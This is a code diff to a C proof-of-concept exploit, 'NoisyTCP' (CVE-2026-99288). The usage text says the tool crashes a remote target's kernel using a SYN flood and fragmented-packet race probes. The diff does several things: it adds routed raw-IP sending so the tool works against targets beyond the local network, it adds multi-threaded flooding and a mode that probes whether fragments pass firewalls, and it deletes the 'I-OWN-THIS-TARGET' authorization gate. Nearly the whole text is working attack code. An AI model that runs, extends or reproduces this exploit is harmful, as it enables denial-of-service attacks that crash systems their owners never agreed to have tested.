@@ -75,6 +75,8 @@
 #include <sys/ioctl.h>
 #include <sys/socket.h>
 #include <sys/types.h>
+#include <poll.h>
+#include <sched.h>
 
 /* ------------------------------------------------------------------ */
 /* Limits and tunables                                                 */
@@ -111,6 +113,7 @@ struct config {
     int      flood_sports;        /* number of flood source ports          */
 
     int      flood_pps;           /* SYN flood rate (per flood thread)     */
+    int      flood_threads;       /* number of SYN flood threads           */
     int      race_pps;            /* probe rate per race thread            */
     int      race_threads;        /* number of race worker threads         */
     int      pulse_ms;            /* flood gate period; 0 = always on      */
@@ -118,15 +121,21 @@ struct config {
     int      burst;               /* fragmented probes per cycle (1..6)    */
     int      mss;                 /* MSS advertised in SYN (cookie mssind) */
     int      nofrag;              /* disable fragmentation (debug)         */
+    int      pin;                 /* pin workers to distinct CPUs          */
+
+    int      l3;                  /* 1 = routed raw-IP TX, 0 = AF_PACKET L2 */
+    int      force_l3;
+    int      force_l2;
 
     int      dry_run;
     int      selftest;
+    int      probe;
     int      authorized;
 };
 
 static struct config cfg = {
     .tuples = 8, .base_sport = 40000, .flood_sport = 50000, .flood_sports = 2048,
-    .flood_pps = 20000, .race_pps = 20000, .race_threads = 4, .pulse_ms = 400,
+    .flood_pps = 20000, .flood_threads = 1, .race_pps = 20000, .race_threads = 4, .pulse_ms = 400,
     .duration_s = 0, .burst = 3, .mss = 1460,
 };
 
@@ -135,7 +144,9 @@ static _Atomic int flood_on = 1;
 static _Atomic int running = 1;
 static _Atomic uint64_t tx_total, flood_tx, race_tx, synack_rx, cookie_hits;
 static int rx_sock = -1;
+static int ncpu = 1;
 static struct sockaddr_ll tx_sa;
+static struct sockaddr_in tx_sin;
 
 /* forward decls (socket helpers are defined below the worker threads) */
 static int open_tx_socket(void);
@@ -205,6 +216,7 @@ static uint16_t tcp4_csum(uint32_t saddr, uint32_t daddr,
 /* ------------------------------------------------------------------ */
 static int build_eth(uint8_t *out, const uint8_t *dst, const uint8_t *src)
 {
+    if (cfg.l3) return 0;                     /* routed raw-IP: no L2 header */
     memcpy(out, dst, 6);
     memcpy(out + 6, src, 6);
     out[12] = 0x08; out[13] = 0x00;          /* ETH_P_IP */
@@ -285,14 +297,16 @@ static int frame_single(uint8_t *out, uint16_t sport, uint32_t seq, uint32_t ack
  * Returns number of frames (2).
  */
 static int frame_frag(uint8_t *out, uint16_t sport, uint32_t seq, uint32_t ack,
-                      uint8_t flags, const uint8_t *payload, int payload_len,
-                      uint16_t ipid)
+                      uint8_t flags, const uint8_t *opts, int opts_len,
+                      const uint8_t *payload, int payload_len,
+                      uint16_t ipid, int first)
 {
     uint8_t datagram[FRAME_MAX];
     int ip_len = build_ip_tcp(datagram, sport, cfg.dport, seq, ack, flags,
-                              NULL, 0, payload, payload_len, ipid, 0);
+                              opts, opts_len, payload, payload_len, ipid, 0);
     int ip_payload = ip_len - (int)sizeof(struct iphdr);
-    int first = 8;                              /* bytes of payload in frag1 */
+    if (first < 8) first = 8;
+    if (first > 64 || (first & 7)) first = 8;
     if (ip_payload <= first) {                  /* too small: send unfragmented */
         int n = build_eth(out, cfg.dst_mac, cfg.src_mac);
         memcpy(out + n, datagram, ip_len);
@@ -326,20 +340,23 @@ static int frame_frag(uint8_t *out, uint16_t sport, uint32_t seq, uint32_t ack,
 /* Same as frame_frag but reports the two frame lengths. */
 static int frame_frag_len(uint8_t *out, int *len1, int *len2,
                           uint16_t sport, uint32_t seq, uint32_t ack,
-                          uint8_t flags, const uint8_t *payload, int payload_len,
-                          uint16_t ipid)
+                          uint8_t flags, const uint8_t *opts, int opts_len,
+                          const uint8_t *payload, int payload_len,
+                          uint16_t ipid, int first)
 {
-    int nf = frame_frag(out, sport, seq, ack, flags, payload, payload_len, ipid);
+    int nf = frame_frag(out, sport, seq, ack, flags, opts, opts_len,
+                        payload, payload_len, ipid, first);
+    int hl = cfg.l3 ? 0 : ETHER_HDR_LEN;
     if (nf == 1) {
-        struct iphdr *ip = (struct iphdr *)(out + ETHER_HDR_LEN);
-        *len1 = ETHER_HDR_LEN + ntohs(ip->tot_len);
+        struct iphdr *ip = (struct iphdr *)(out + hl);
+        *len1 = hl + ntohs(ip->tot_len);
         *len2 = 0;
         return 1;
     }
-    struct iphdr *ip1 = (struct iphdr *)(out + ETHER_HDR_LEN);
-    struct iphdr *ip2 = (struct iphdr *)(out + FRAME_MAX + ETHER_HDR_LEN);
-    *len1 = ETHER_HDR_LEN + ntohs(ip1->tot_len);
-    *len2 = ETHER_HDR_LEN + ntohs(ip2->tot_len);
+    struct iphdr *ip1 = (struct iphdr *)(out + hl);
+    struct iphdr *ip2 = (struct iphdr *)(out + FRAME_MAX + hl);
+    *len1 = hl + ntohs(ip1->tot_len);
+    *len2 = hl + ntohs(ip2->tot_len);
     return 2;
 }
 
@@ -359,8 +376,13 @@ static int send_batch(int sock, struct framebuf *fb, int n)
         iov[i].iov_len = fb[i].len;
         msg[i].msg_hdr.msg_iov = &iov[i];
         msg[i].msg_hdr.msg_iovlen = 1;
-        msg[i].msg_hdr.msg_name = &tx_sa;
-        msg[i].msg_hdr.msg_namelen = sizeof(tx_sa);
+        if (cfg.l3) {
+            msg[i].msg_hdr.msg_name = &tx_sin;
+            msg[i].msg_hdr.msg_namelen = sizeof(tx_sin);
+        } else {
+            msg[i].msg_hdr.msg_name = &tx_sa;
+            msg[i].msg_hdr.msg_namelen = sizeof(tx_sa);
+        }
     }
     int sent = sendmmsg(sock, msg, n, 0);
     if (sent < 0) {
@@ -423,9 +445,20 @@ static void *rx_thread(void *arg)
 /* ------------------------------------------------------------------ */
 /* Flood thread: SYN flood to drive syncookies + queue oscillation     */
 /* ------------------------------------------------------------------ */
+static void pin_to(int cpu)
+{
+    if (!cfg.pin || cpu < 0) return;
+    cpu_set_t set;
+    CPU_ZERO(&set);
+    CPU_SET(cpu % ncpu, &set);
+    if (sched_setaffinity(0, sizeof(set), &set) < 0)
+        fprintf(stderr, "[pin] cpu %d: %s\n", cpu % ncpu, strerror(errno));
+}
+
 static void *flood_thread(void *arg)
 {
-    (void)arg;
+    int tid = arg ? *(int *)arg : 0;
+    pin_to(ncpu - 1 - tid);
     struct framebuf fb[BATCH_MAX];
     uint8_t opts[4];
     int opts_len = mss_option(opts, cfg.mss);
@@ -496,7 +529,8 @@ static void race_one_cycle(int idx, struct framebuf *fb, int *n)
             int l1, l2;
             uint8_t tmp[2 * FRAME_MAX];
             int nf = frame_frag_len(tmp, &l1, &l2, sp, X + 1, 0, TH_ACK,
-                                    pad, sizeof(pad), (uint16_t)(ipid + k));
+                                    NULL, 0, pad, sizeof(pad),
+                                    (uint16_t)(ipid + k), 8);
             fb[*n].len = l1; memcpy(fb[*n].data, tmp, l1); (*n)++;
             if (nf == 2 && *n < BATCH_MAX) {
                 fb[*n].len = l2; memcpy(fb[*n].data, tmp + FRAME_MAX, l2); (*n)++;
@@ -529,6 +563,7 @@ static void race_one_cycle(int idx, struct framebuf *fb, int *n)
 static void *race_thread(void *arg)
 {
     int tid = *(int *)arg;
+    pin_to(tid);
     struct framebuf fb[BATCH_MAX];
     int sock = cfg.dry_run ? -1 : open_tx_socket();
     if (!cfg.dry_run && sock < 0) {
@@ -613,6 +648,46 @@ static void *stats_thread(void *arg)
 /* ------------------------------------------------------------------ */
 /* Interface / MAC / ARP resolution                                    */
 /* ------------------------------------------------------------------ */
+
+/*
+ * Longest-prefix lookup in /proc/net/route. Gives the egress interface and
+ * next-hop gateway for `dst`. *gw == 0 means the destination is on-link, i.e.
+ * the target sits on the same L2 segment and AF_PACKET/ARP can be used.
+ */
+static int route_lookup(uint32_t dst, char *ifname, size_t ifname_sz, uint32_t *gw)
+{
+    FILE *f = fopen("/proc/net/route", "r");
+    if (!f) return -1;
+    char line[512];
+    if (!fgets(line, sizeof(line), f)) { fclose(f); return -1; }
+
+    int found = 0;
+    uint32_t best_mask = 0, best_gw = 0;
+    char best_if[IFNAMSIZ] = {0};
+
+    while (fgets(line, sizeof(line), f)) {
+        char ifc[IFNAMSIZ] = {0};
+        unsigned long dest, gwv, flags, mask;
+        int nf = sscanf(line, "%15s %lx %lx %lx %*u %*u %*u %lx",
+                        ifc, &dest, &gwv, &flags, &mask);
+        if (nf != 5) continue;
+        if (!(flags & 0x1)) continue;                   /* RTF_UP */
+        uint32_t d = (uint32_t)dest, m = (uint32_t)mask;
+        if ((dst & m) != d) continue;
+        if (!found || m > best_mask) {
+            found = 1;
+            best_mask = m;
+            best_gw = (uint32_t)gwv;
+            snprintf(best_if, sizeof(best_if), "%s", ifc);
+        }
+    }
+    fclose(f);
+    if (!found) return -1;
+    if (ifname && ifname_sz) snprintf(ifname, ifname_sz, "%s", best_if);
+    if (gw) *gw = best_gw;
+    return 0;
+}
+
 static int get_if_info(void)
 {
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
@@ -628,7 +703,7 @@ static int get_if_info(void)
     return 0;
 }
 
-static int open_packet_socket(void)
+static int open_packet_socket(int ifindex)
 {
     int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
     if (s < 0) return -1;
@@ -636,7 +711,7 @@ static int open_packet_socket(void)
     memset(&sa, 0, sizeof(sa));
     sa.sll_family = AF_PACKET;
     sa.sll_protocol = htons(ETH_P_ALL);
-    sa.sll_ifindex = cfg.ifindex;
+    sa.sll_ifindex = ifindex;
     if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) { close(s); return -1; }
     int one = 1;
     setsockopt(s, SOL_SOCKET, SO_BROADCAST, &one, sizeof(one));
@@ -647,9 +722,23 @@ static int open_packet_socket(void)
  * Send-only AF_PACKET socket: protocol 0 disables packet reception, so each
  * worker thread can own a TX socket without RX overhead or shared-socket lock
  * contention. A larger send buffer absorbs bursts and reduces ENOBUFS drops.
+ * In routed (L3) mode the socket is a raw IPv4 socket with IP_HDRINCL: the
+ * kernel routes each crafted datagram through the next hop, so no MAC/ARP is
+ * needed and the target may be many hops away.
  */
 static int open_tx_socket(void)
 {
+    if (cfg.l3) {
+        int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+        if (s < 0) return -1;
+        int one = 1;
+        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
+            close(s); return -1;
+        }
+        int buf = 4 * 1024 * 1024;
+        setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
+        return s;
+    }
     int s = socket(AF_PACKET, SOCK_RAW, 0);
     if (s < 0) return -1;
     struct sockaddr_ll sa;
@@ -710,6 +799,72 @@ static int resolve_dst_mac(void)
     return -1;
 }
 
+/*
+ * Reachability probe: fire a handful of SYNs and report how many SYN-ACKs come
+ * back. `first == 0` sends plain packets; `first > 0` splits each SYN across two
+ * IP fragments with that many payload bytes in fragment 1. Splitting at 8 hides
+ * the whole L4 header (what the race needs); 32/40 keep the ports visible, which
+ * distinguishes "path drops all fragments" from "path drops only short first
+ * fragments" (some inspection devices drop those).
+ */
+static int probe_target(int first, uint16_t p0)
+{
+    struct framebuf fb[BATCH_MAX];
+    uint8_t opts[4];
+    int ol = mss_option(opts, cfg.mss);
+    int want = 5, n = 0;
+
+    for (int i = 0; i < want && n < BATCH_MAX - 2; i++) {
+        uint16_t sp = (uint16_t)(p0 + i);
+        uint32_t seq = 0x40000000u + (uint32_t)i * 4099u;
+        if (!first) {
+            fb[n].len = frame_single(fb[n].data, sp, seq, 0, TH_SYN,
+                                     opts, ol, NULL, 0, (uint16_t)(0x4010 + i));
+            n++;
+        } else {
+            uint8_t tmp[2 * FRAME_MAX];
+            int l1 = 0, l2 = 0;
+            int nf = frame_frag_len(tmp, &l1, &l2, sp, seq, 0, TH_SYN,
+                                    opts, ol, NULL, 0,
+                                    (uint16_t)(0x4110 + i), first);
+            fb[n].len = l1; memcpy(fb[n].data, tmp, l1); n++;
+            if (nf == 2 && n < BATCH_MAX) {
+                fb[n].len = l2; memcpy(fb[n].data, tmp + FRAME_MAX, l2); n++;
+            }
+        }
+    }
+
+    int sock = open_tx_socket();
+    if (sock < 0) {
+        fprintf(stderr, "probe: TX socket failed: %s\n", strerror(errno));
+        return -1;
+    }
+    send_batch(sock, fb, n);
+    close(sock);
+
+    int seen = 0;
+    uint64_t deadline = now_ms() + 3000;
+    uint8_t buf[2048];
+    while (seen < want && now_ms() < deadline) {
+        struct pollfd p = { .fd = rx_sock, .events = POLLIN };
+        if (poll(&p, 1, 100) <= 0) continue;
+        ssize_t r = recv(rx_sock, buf, sizeof(buf), 0);
+        if (r < (ssize_t)(ETHER_HDR_LEN + sizeof(struct iphdr))) continue;
+        if (((buf[12] << 8) | buf[13]) != ETH_P_IP) continue;
+        const struct iphdr *ip = (const struct iphdr *)(buf + ETHER_HDR_LEN);
+        if (ip->protocol != IPPROTO_TCP || ip->saddr != cfg.dst_ip) continue;
+        int ihl = ip->ihl * 4;
+        if ((int)r < ETHER_HDR_LEN + ihl + (int)sizeof(struct tcphdr)) continue;
+        const struct tcphdr *th =
+            (const struct tcphdr *)(buf + ETHER_HDR_LEN + ihl);
+        if (!th->syn || !th->ack) continue;
+        if (ntohs(th->source) != cfg.dport) continue;
+        uint16_t dp = ntohs(th->dest);
+        if (dp >= p0 && dp < (uint16_t)(p0 + want)) seen++;
+    }
+    return seen;
+}
+
 /* ------------------------------------------------------------------ */
 /* Selftest: build sample packets and dump, no network                 */
 /* ------------------------------------------------------------------ */
@@ -736,7 +891,7 @@ static int selftest(void)
     uint8_t two[2 * FRAME_MAX]; int l1, l2;
     uint8_t pad[8] = {0};
     int nf = frame_frag_len(two, &l1, &l2, 40000, 0xdeadbeef + 1, 0, TH_ACK,
-                            pad, 8, 3);
+                            NULL, 0, pad, 8, 3, 8);
     hexdump("ACK frag1", two, l1);
     if (nf == 2) hexdump("ACK frag2", two + FRAME_MAX, l2);
     fprintf(stderr, "selftest ok: %d fragments\n", nf);
@@ -750,20 +905,22 @@ static void usage(const char *p)
 {
     fprintf(stderr,
 "NoisyTCP PoC (CVE-2026-99288) -- AUTHORIZED LAB TESTING ONLY\n"
-"Usage: %s --iface IF --target IP --port P --authorize I-OWN-THIS-TARGET [opts]\n"
+"Usage: %s --target IP --port P [opts]\n"
 "\n"
 "Required:\n"
-"  --iface IF            egress interface (lab network)\n"
 "  --target IP           single target IPv4 address\n"
-"  --port P              target TCP port (e.g. 80/443/22)\n"
-"  --authorize STR       must equal I-OWN-THIS-TARGET (safety gate)\n"
+"  --port P              target TCP port (e.g. 80/443/22/25565)\n"
 "\n"
 "Options:\n"
+"  --iface IF            egress interface (auto from route if omitted)\n"
 "  --src IP              source IPv4 (default: iface address)\n"
-"  --dst-mac MAC         target MAC (default: ARP-resolve)\n"
+"  --dst-mac MAC         target MAC (L2 mode; default: ARP-resolve)\n"
+"  --l3                  force routed raw-IP TX (target behind a gateway)\n"
+"  --l2                  force AF_PACKET TX (target on the same L2 segment)\n"
 "  --tuples N            race tuples (default 8, max %d)\n"
 "  --base-sport P        first race source port (default 40000)\n"
-"  --flood-pps N         SYN flood rate (default 20000)\n"
+"  --flood-pps N         SYN flood rate per flood thread (default 20000)\n"
+"  --flood-threads N     SYN flood threads (default 1, max %d)\n"
 "  --race-pps N          probe rate per race thread (default 20000)\n"
 "  --race-threads N      race worker threads (default 4, max %d, <= tuples)\n"
 "  --pulse-ms N          flood gate period ms, 0=always on (default 400)\n"
@@ -771,12 +928,17 @@ static void usage(const char *p)
 "  --duration S          stop after S seconds (default: until Ctrl-C)\n"
 "  --mss N               SYN MSS (default 1460)\n"
 "  --nofrag              disable fragmentation (debug; race won't trigger)\n"
+"  --pin                 pin workers to distinct CPUs\n"
+"  --probe               plain+fragmented SYN check, report, exit\n"
 "  --dry-run             build packets but do not send\n"
 "  --selftest            dump sample packets and exit\n"
 "\n"
+"L2 vs L3 is auto-detected: an on-link target uses AF_PACKET/ARP, a routed\n"
+"target uses raw IP with IP_HDRINCL (works across gateways, no MAC needed).\n"
+"\n"
 "This tool crashes the target kernel. Use only on systems you own or are\n"
 "explicitly authorized to test. See README.md.\n",
-        p, MAX_TUPLES, MAX_RACE_THREADS);
+        p, MAX_TUPLES, MAX_RACE_THREADS, MAX_RACE_THREADS);
 }
 
 static int parse_mac(const char *s, uint8_t *m)
@@ -816,22 +978,25 @@ int main(int argc, char **argv)
         {"tuples", required_argument, 0, 'n'},
         {"base-sport", required_argument, 0, 'b'},
         {"flood-pps", required_argument, 0, 'F'},
+        {"flood-threads", required_argument, 0, 'X'},
         {"race-pps", required_argument, 0, 'R'},
         {"race-threads", required_argument, 0, 'T'},
         {"pulse-ms", required_argument, 0, 'P'},
         {"burst", required_argument, 0, 'B'},
         {"duration", required_argument, 0, 'd'},
         {"mss", required_argument, 0, 'M'},
-        {"authorize", required_argument, 0, 'A'},
         {"nofrag", no_argument, 0, 'N'},
+        {"pin", no_argument, 0, 'G'},
         {"dry-run", no_argument, 0, 'D'},
         {"selftest", no_argument, 0, 'S'},
+        {"l3", no_argument, 0, '3'},
+        {"l2", no_argument, 0, '2'},
+        {"probe", no_argument, 0, 'C'},
         {"help", no_argument, 0, 'h'},
         {0,0,0,0}
     };
     int c, have_dstmac = 0;
-    const char *auth = NULL;
-    while ((c = getopt_long(argc, argv, "i:t:p:s:m:n:b:F:R:T:P:B:d:M:A:NDSH", lo, NULL)) != -1) {
+    while ((c = getopt_long(argc, argv, "i:t:p:s:m:n:b:F:X:R:T:P:B:d:M:NDS23CG", lo, NULL)) != -1) {
         switch (c) {
         case 'i': memcpy(cfg.iface, optarg, strnlen(optarg, IFNAMSIZ-1)); break;
         case 't': cfg.dst_ip = inet_addr(optarg); break;
@@ -841,16 +1006,20 @@ int main(int argc, char **argv)
         case 'n': cfg.tuples = atoi(optarg); break;
         case 'b': cfg.base_sport = (uint16_t)atoi(optarg); break;
         case 'F': cfg.flood_pps = atoi(optarg); break;
+        case 'X': cfg.flood_threads = atoi(optarg); break;
         case 'R': cfg.race_pps = atoi(optarg); break;
         case 'T': cfg.race_threads = atoi(optarg); break;
         case 'P': cfg.pulse_ms = atoi(optarg); break;
         case 'B': cfg.burst = atoi(optarg); break;
         case 'd': cfg.duration_s = atoi(optarg); break;
         case 'M': cfg.mss = atoi(optarg); break;
-        case 'A': auth = optarg; break;
         case 'N': cfg.nofrag = 1; break;
         case 'D': cfg.dry_run = 1; break;
         case 'S': cfg.selftest = 1; break;
+        case '3': cfg.force_l3 = 1; break;
+        case '2': cfg.force_l2 = 1; break;
+        case 'C': cfg.probe = 1; break;
+        case 'G': cfg.pin = 1; break;
         default: usage(argv[0]); return 1;
         }
     }
@@ -860,27 +1029,41 @@ int main(int argc, char **argv)
     if (cfg.tuples < 1 || cfg.tuples > MAX_TUPLES) {
         fprintf(stderr, "tuples must be 1..%d\n", MAX_TUPLES); return 1;
     }
-    if (!cfg.iface[0] || !cfg.dst_ip || !cfg.dport) { usage(argv[0]); return 1; }
-    if (!auth || strcmp(auth, "I-OWN-THIS-TARGET") != 0) {
-        fprintf(stderr,
-            "\n[!] SAFETY GATE: this tool crashes the target kernel (remote DoS).\n"
-            "[!] Pass --authorize I-OWN-THIS-TARGET to confirm you own or are\n"
-            "[!] explicitly authorized to test this target. Lab use only.\n\n");
-        return 2;
+    if (!cfg.dst_ip || !cfg.dport) { usage(argv[0]); return 1; }
+
+    char dst_s[INET_ADDRSTRLEN] = "?", src_s[INET_ADDRSTRLEN] = "?";
+    inet_ntop(AF_INET, &cfg.dst_ip, dst_s, sizeof(dst_s));
+
+    /* --- L2 (on-link, AF_PACKET/ARP) vs L3 (routed, raw IP) --- */
+    char rif[IFNAMSIZ] = {0};
+    uint32_t gw = 0;
+    int have_route = route_lookup(cfg.dst_ip, rif, sizeof(rif), &gw);
+    if (cfg.force_l3)      cfg.l3 = 1;
+    else if (cfg.force_l2) cfg.l3 = 0;
+    else                   cfg.l3 = (have_route == 0 && gw != 0);
+
+    if (!cfg.iface[0] && have_route == 0)
+        snprintf(cfg.iface, sizeof(cfg.iface), "%s", rif);
+    if (!cfg.iface[0]) {
+        fprintf(stderr, "no route to %s and no --iface given\n", dst_s);
+        return 1;
     }
-    cfg.authorized = 1;
+    if (cfg.l3 && have_route < 0)
+        fprintf(stderr, "[!] no /proc/net/route entry for %s; using --iface\n",
+                dst_s);
 
     if (cfg.dry_run) {
         fprintf(stderr, "[*] DRY-RUN: no packets will be sent\n");
+        if (cfg.duration_s == 0) cfg.duration_s = 3;
     } else {
         fprintf(stderr,
             "\n============================================================\n"
             " NoisyTCP PoC -- CVE-2026-99288 -- WILL CRASH THE TARGET\n"
-            " target=%s:%u iface=%s tuples=%d race-threads=%d\n"
+            " target=%s:%u iface=%s tuples=%d race-threads=%d mode=%s\n"
             " Authorized lab testing only. Ctrl-C to stop.\n"
             "============================================================\n\n",
-            inet_ntoa(*(struct in_addr *)&cfg.dst_ip), cfg.dport, cfg.iface,
-            cfg.tuples, cfg.race_threads);
+            dst_s, cfg.dport, cfg.iface, cfg.tuples, cfg.race_threads,
+            cfg.l3 ? "routed(L3)" : "onlink(L2)");
     }
 
     if (get_if_info() < 0) {
@@ -889,15 +1072,22 @@ int main(int argc, char **argv)
     }
     if (!cfg.src_ip) cfg.src_ip = iface_ipv4(cfg.iface);
     if (!cfg.src_ip) { fprintf(stderr, "no source IP; use --src\n"); return 1; }
+    inet_ntop(AF_INET, &cfg.src_ip, src_s, sizeof(src_s));
+    ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
+    if (ncpu < 1) ncpu = 1;
 
     /* clamp race worker count: at least 1, at most MAX_RACE_THREADS and tuples */
     if (cfg.race_threads < 1) cfg.race_threads = 1;
     if (cfg.race_threads > MAX_RACE_THREADS) cfg.race_threads = MAX_RACE_THREADS;
     if (cfg.race_threads > cfg.tuples) cfg.race_threads = cfg.tuples;
+    if (cfg.flood_threads < 1) cfg.flood_threads = 1;
+    if (cfg.flood_threads > MAX_RACE_THREADS) cfg.flood_threads = MAX_RACE_THREADS;
 
     rx_sock = -1;
     if (!cfg.dry_run) {
-        rx_sock = open_packet_socket();
+        /* in L3 mode sniff on every iface: the reply may not come back on the
+         * egress device on multi-homed hosts */
+        rx_sock = open_packet_socket(cfg.l3 ? 0 : cfg.ifindex);
         if (rx_sock < 0) {
             fprintf(stderr, "AF_PACKET socket failed (need root/CAP_NET_RAW): %s\n",
                     strerror(errno));
@@ -911,18 +1101,69 @@ int main(int argc, char **argv)
     tx_sa.sll_halen = 6;
     memcpy(tx_sa.sll_addr, cfg.dst_mac, 6);
 
-    if (!have_dstmac && !cfg.dry_run) {
-        fprintf(stderr, "[*] ARP-resolving %s ...\n",
-                inet_ntoa(*(struct in_addr *)&cfg.dst_ip));
+    memset(&tx_sin, 0, sizeof(tx_sin));
+    tx_sin.sin_family = AF_INET;
+    tx_sin.sin_addr.s_addr = cfg.dst_ip;
+    tx_sin.sin_port = htons(cfg.dport);
+
+    if (cfg.l3) {
+        char gw_s[INET_ADDRSTRLEN] = "-";
+        if (gw) inet_ntop(AF_INET, &gw, gw_s, sizeof(gw_s));
+        fprintf(stderr,
+            "[*] L3 mode via %s next-hop %s: no ARP, kernel routes each frame\n",
+            cfg.iface, gw_s);
+        fprintf(stderr,
+            "[*] suppress the local kernel's RSTs for our ports, else the reply\n"
+            "    resets the tuple we are racing:\n"
+            "    iptables -I OUTPUT -p tcp --tcp-flags RST RST"
+            " -m multiport --sports %u:%u -j DROP\n",
+            (unsigned)cfg.base_sport, (unsigned)(cfg.base_sport + cfg.tuples - 1));
+    } else if (!have_dstmac && !cfg.dry_run) {
+        fprintf(stderr, "[*] ARP-resolving %s ...\n", dst_s);
         if (resolve_dst_mac() < 0) {
-            fprintf(stderr, "ARP resolution failed; pass --dst-mac\n"); return 1;
+            fprintf(stderr, "ARP resolution failed; pass --dst-mac or --l3\n");
+            return 1;
         }
         memcpy(tx_sa.sll_addr, cfg.dst_mac, 6);
     }
-    fprintf(stderr, "[*] src=%s mac=%02x:%02x:%02x:%02x:%02x:%02x dst-mac=%02x:%02x:%02x:%02x:%02x:%02x\n",
-            inet_ntoa(*(struct in_addr *)&cfg.src_ip),
+    fprintf(stderr, "[*] src=%s mac=%02x:%02x:%02x:%02x:%02x:%02x"
+                    " dst=%s dst-mac=%02x:%02x:%02x:%02x:%02x:%02x\n",
+            src_s,
             cfg.src_mac[0],cfg.src_mac[1],cfg.src_mac[2],cfg.src_mac[3],cfg.src_mac[4],cfg.src_mac[5],
+            dst_s,
             cfg.dst_mac[0],cfg.dst_mac[1],cfg.dst_mac[2],cfg.dst_mac[3],cfg.dst_mac[4],cfg.dst_mac[5]);
+
+    if (cfg.probe && !cfg.dry_run) {
+        uint16_t b = cfg.base_sport;
+        int plain = probe_target(0,   (uint16_t)(b + 128));
+        if (plain < 0) return 1;
+        int f8  = probe_target(8,   (uint16_t)(b + 144));
+        if (f8 < 0) return 1;
+        int f32 = probe_target(32,  (uint16_t)(b + 160));
+        if (f32 < 0) return 1;
+        int f40 = probe_target(40,  (uint16_t)(b + 176));
+        if (f40 < 0) return 1;
+        fprintf(stderr,
+            "[*] probe plain=%d/5 frag8=%d/5 frag32=%d/5 frag40=%d/5"
+            " from %s:%u\n", plain, f8, f32, f40, dst_s, cfg.dport);
+        if (plain == 0) {
+            fprintf(stderr, "[!] no SYN-ACK at all: target down, filtered, "
+                            "or an asymmetric return path\n");
+        } else if (f8 == 0 && f32 == 0 && f40 == 0) {
+            fprintf(stderr, "[!] every fragmented variant dropped while plain "
+                            "passes: a hop on the path eats IP fragments (NAT/"
+                            "firewall/scrubber). No L3/L4 queue split, race "
+                            "cannot fire from this position\n");
+        } else if (f8 == 0) {
+            fprintf(stderr, "[!] long fragments pass, 8-byte first fragment "
+                            "does not: the path inspects the L4 header. Race "
+                            "needs the hidden-header split, still blocked\n");
+        } else {
+            fprintf(stderr, "[*] 8-byte split passes, race is viable\n");
+        }
+        if (rx_sock >= 0) close(rx_sock);
+        return (plain > 0 && f8 > 0) ? 0 : 1;
+    }
 
     /* init tuples */
     srand((unsigned)time(NULL));
@@ -939,13 +1180,18 @@ int main(int argc, char **argv)
     signal(SIGINT, on_sig);
     signal(SIGTERM, on_sig);
 
-    pthread_t th_rx, th_flood, th_pulse, th_stats;
+    pthread_t th_rx, th_pulse, th_stats;
     pthread_t th_race[MAX_RACE_THREADS];
+    pthread_t th_flood[MAX_RACE_THREADS];
     int race_ids[MAX_RACE_THREADS];
+    int flood_ids[MAX_RACE_THREADS];
     pthread_create(&th_rx, NULL, rx_thread, NULL);
     pthread_create(&th_pulse, NULL, pulse_thread, NULL);
     pthread_create(&th_stats, NULL, stats_thread, NULL);
-    pthread_create(&th_flood, NULL, flood_thread, NULL);
+    for (int i = 0; i < cfg.flood_threads; i++) {
+        flood_ids[i] = i;
+        pthread_create(&th_flood[i], NULL, flood_thread, &flood_ids[i]);
+    }
     for (int i = 0; i < cfg.race_threads; i++) {
         race_ids[i] = i;
         pthread_create(&th_race[i], NULL, race_thread, &race_ids[i]);
@@ -954,7 +1200,8 @@ int main(int argc, char **argv)
     for (int i = 0; i < cfg.race_threads; i++)
         pthread_join(th_race[i], NULL);
     atomic_store(&running, 0);
-    pthread_join(th_flood, NULL);
+    for (int i = 0; i < cfg.flood_threads; i++)
+        pthread_join(th_flood[i], NULL);
     pthread_join(th_pulse, NULL);
     pthread_join(th_stats, NULL);
     pthread_join(th_rx, NULL);
